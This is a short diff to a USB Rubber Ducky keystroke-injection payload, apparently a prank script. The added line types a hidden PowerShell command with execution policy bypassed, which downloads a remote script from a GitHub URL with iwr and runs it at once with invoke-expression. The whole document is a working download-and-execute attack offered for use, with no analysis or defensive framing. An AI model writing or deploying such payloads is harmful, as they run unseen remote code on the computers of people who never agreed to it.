@@ -1,4 +1,4 @@
 GUI r
 DELAY 500
-STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr [link]?dl=1; invoke-expression $pl
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://github.com/Windows-10-XD/rubber-ducky-screenshotbackground/blob/main/script.ps1?dl=1; invoke-expression $pl
 ENTER
